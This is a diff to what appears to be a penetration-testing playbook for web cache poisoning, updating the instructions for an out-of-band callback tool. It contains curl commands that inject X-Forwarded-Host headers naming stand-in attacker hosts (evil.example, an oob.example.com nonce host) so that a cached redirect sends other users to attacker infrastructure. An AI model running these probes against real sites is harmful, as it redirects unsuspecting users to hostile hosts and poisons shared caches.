@@ -19,7 +19,7 @@ vuln_class: cache-poisoning
 
 - `vigil assess kali exec -- curl ...` (header injection probing and cache behavior analysis — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30` for probing calls)
 - `vigil assess anomaly-score` — for unkeyed-input discovery (§2/§3): record one response per candidate header/cookie and let it rank which injected input actually shifted the response, instead of diffing curl bodies by eye.
-- `vigil oob mint` / `vigil oob poll` — for redirect-based poisoning (§9) where the poisoned `Location` points at attacker infra: mint a nonce-tagged host, force it into the cached redirect, then `poll` to confirm a victim followed it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`.
+- `vigil oob mint` / `vigil oob poll` — for redirect-based poisoning (§9) where the poisoned `Location` points at attacker infra: `mint` binds the nonce under a running client's interactsh id and prints the exact host (`$OOB_HOST`, of shape `<nonce>.<client-id>.oob.example.com`) so `poll` can correlate it — pass `--client <name>` when several clients run. Force the exact host mint prints into the cached redirect, then `poll` to confirm a victim followed it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`.
 - `Param Miner` (Burp extension for unkeyed header/parameter discovery)
 - Browser (verify poisoned responses served to other users)
 
@@ -109,10 +109,11 @@ curl -H "Accept-Encoding: gzip" -H "X-Forwarded-Host: evil.example" https://targ
 ### 9. Redirect-Based Poisoning
 - [ ] Poison redirect target via `X-Forwarded-Scheme: http` / `X-Forwarded-Host` forcing a 301/302 to an attacker-controlled location. Point the poisoned redirect at a minted callback host so a victim following the cached redirect is provably attributable — `poll` turns "the redirect points at attacker.example" into "a real client followed the poisoned redirect":
 ```bash
-vigil oob mint --technique cache-poison --target-url "https://target/" \
+vigil oob mint --client <name> --technique cache-poison --target-url "https://target/" \
   --param X-Forwarded-Host --probe-kind redirect-poison
-# Poison: force the cached Location to the minted host
-curl -H "X-Forwarded-Host: <nonce>.oob.example.com" -H "X-Forwarded-Scheme: https" https://target/
+# → host  <nonce>.<client-id>.oob.example.com   (= $OOB_HOST)
+# Poison: force the cached Location to the exact host mint printed ($OOB_HOST)
+curl -H "X-Forwarded-Host: $OOB_HOST" -H "X-Forwarded-Scheme: https" https://target/
 # Confirm: a victim (or your own clean fetch of the cached entry) followed it
 vigil oob poll --client <name>     # matched row = the poisoned redirect was followed
 ```
